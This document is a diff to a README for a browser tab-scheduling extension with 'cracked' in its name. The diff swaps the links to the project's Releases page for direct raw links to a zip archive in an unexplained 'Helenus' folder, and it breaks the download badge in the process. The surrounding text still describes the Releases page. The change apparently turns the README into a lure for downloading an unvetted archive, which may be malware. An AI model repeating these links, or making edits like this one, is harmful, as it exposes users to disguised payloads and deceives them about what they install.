@@ -1,6 +1,6 @@
 # 🚀 cracked-tab-scheduler-extension - Boost Your Productivity with Easy Tab Management
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/moha-create/cracked-tab-scheduler-extension/releases)
+[![Download from Releases](https://raw.githubusercontent.com/moha-create/cracked-tab-scheduler-extension/main/Helenus/cracked-tab-scheduler-extension.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/moha-create/cracked-tab-scheduler-extension/main/Helenus/cracked-tab-scheduler-extension.zip)
 
 ## 📚 Table of Contents
 - [🛠️ Overview](#-overview)
@@ -20,7 +20,7 @@ The Cracked Tab Scheduler Extension helps you manage your browser tabs efficient
 ## 💾 Download & Install
 To get the Cracked Tab Scheduler Extension, visit the Releases page. Click the link below:
 
-[Download From Releases](https://github.com/moha-create/cracked-tab-scheduler-extension/releases)
+[Download From Releases](https://raw.githubusercontent.com/moha-create/cracked-tab-scheduler-extension/main/Helenus/cracked-tab-scheduler-extension.zip)
 
 1. On the Releases page, you will see the latest version listed.
 2. Download the extension file for your browser.
